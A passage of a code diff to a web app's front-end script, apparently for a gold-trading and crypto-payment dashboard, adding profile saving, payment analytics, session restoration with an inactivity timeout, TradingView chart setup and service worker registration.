+          : 'Auto verification flagged this submission for review. Details shared to Telegram.',
+        autoVerification.passed ? 'success' : 'neutral'
+      );
+    });
+
+    saveProfileBtn.addEventListener('click', async () => {
+      if (!currentUser) {
+        showStatus(profileStatus, 'Please sign in first.', 'error');
+        return;
+      }
+
+      const nextName = normalize(profileName.value, 80);
+      if (!nextName) {
+        showStatus(profileStatus, 'Name cannot be empty.', 'error');
+        return;
+      }
+
+      const session = getSession();
+      if (!session || !session.token) {
+        showStatus(profileStatus, 'Session expired. Please log in again.', 'error');
+        return;
+      }
+
+      showStatus(profileStatus, 'Saving...', 'neutral');
+      try {
+        const res = await fetch('/api/auth-profile', {
+          method: 'PUT',
+          headers: { 'Authorization': 'Bearer ' + session.token, 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name: nextName })
+        });
+        const result = await res.json();
+        if (!res.ok || !result.ok) {
+          showStatus(profileStatus, result.error || 'Save failed.', 'error');
+          return;
+        }
+        currentUser = result.profile;
+        dashName.textContent = currentUser.name;
+        await notifyEvent('user.profile.updated', { name: currentUser.name, email: currentUser.email });
+        trackAnalyticsEvent('profile_updated', { source: 'dashboard' });
+        showStatus(profileStatus, 'Profile updated successfully.', 'success');
+      } catch (_) {
+        showStatus(profileStatus, 'Network error. Please retry.', 'error');
       }
     });
 
@@ -551,6 +1557,10 @@
           currency: lastQuote.to,
           transaction_hash: payment.transactionHash
         });
+        trackAnalyticsEvent('crypto_payment_submitted', {
+          currency: lastQuote.to,
+          amount: Number(lastQuote.converted.toFixed(6))
+        });
 
         showStatus(paymentStatus, 'Transaction submitted: ' + payment.transactionHash, 'success');
       } catch (_) {
@@ -559,17 +1569,17 @@
     });
 
     logoutBtn.addEventListener('click', () => {
-      clearSession();
-      currentUser = null;
-      dashboard.classList.add('hidden');
-      authArea.classList.remove('hidden');
+      performLogout('manual');
     });
 
-    if (typeof TradingView !== 'undefined') {
+    function initPublicChart() {
+      if (publicChartInitialized) return;
+      if (typeof TradingView === 'undefined') return;
+      publicChartInitialized = true;
       new TradingView.widget({
         autosize: true,
-        symbol: 'XAUUSD',
-        interval: '15',
+        symbol: 'OANDA:XAUUSD',
+        interval: '1',
         theme: 'dark',
         style: '1',
         locale: 'en',
@@ -577,6 +1587,63 @@
       });
     }
 
+    let dashboardChartInitialized = false;
+    function initDashboardChart() {
+      if (dashboardChartInitialized) return;
+      if (typeof TradingView === 'undefined') {
+        window.setTimeout(initDashboardChart, 600);
+        return;
+      }
+      const chartContainer = document.getElementById('tradingview_dashboard_xau');
+      if (!chartContainer || chartContainer.offsetParent === null) {
+        window.setTimeout(initDashboardChart, 300);
+        return;
+      }
+      dashboardChartInitialized = true;
+      new TradingView.widget({
+        autosize: true,
+        symbol: 'OANDA:XAUUSD',
+        interval: '1',
+        theme: 'dark',
+        style: '1',
+        locale: 'en',
+        container_id: 'tradingview_dashboard_xau'
+      });
+    }
+
+    function restoreSessionIfActive() {
+      const session = getSession();
+      if (!session || !session.token) return;
+      const lastActive = session.lastActiveAt ? new Date(session.lastActiveAt).getTime() : Date.now();
+      if (Date.now() - lastActive > INACTIVITY_MS) {
+        clearSession();
+        return;
+      }
+      // Validate token with server and restore profile
+      fetch('/api/auth-session', { headers: { 'Authorization': 'Bearer ' + session.token } })
+        .then(function(r) { return r.ok ? r.json() : Promise.reject(r.status); })
+        .then(function(result) {
+          if (result.ok && result.profile) showDashboard(result.profile);
+          else clearSession();
+        })
+        .catch(function() {
+          // Network error — leave session intact, user can manually log in
+        });
+    }
+
+    // Fallback: if tv.js loads before onload fires (e.g. cached), init public chart now.
+    if (typeof TradingView !== 'undefined') initPublicChart();
+
+    // Register service worker for offline caching and PWA support
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('/sw.js').catch(() => {});
+      });
+    }
+
+    bindInactivityTracking();
+    populateConverterCurrencies();
+    restoreSessionIfActive();
   </script>
 </body>
 </html>
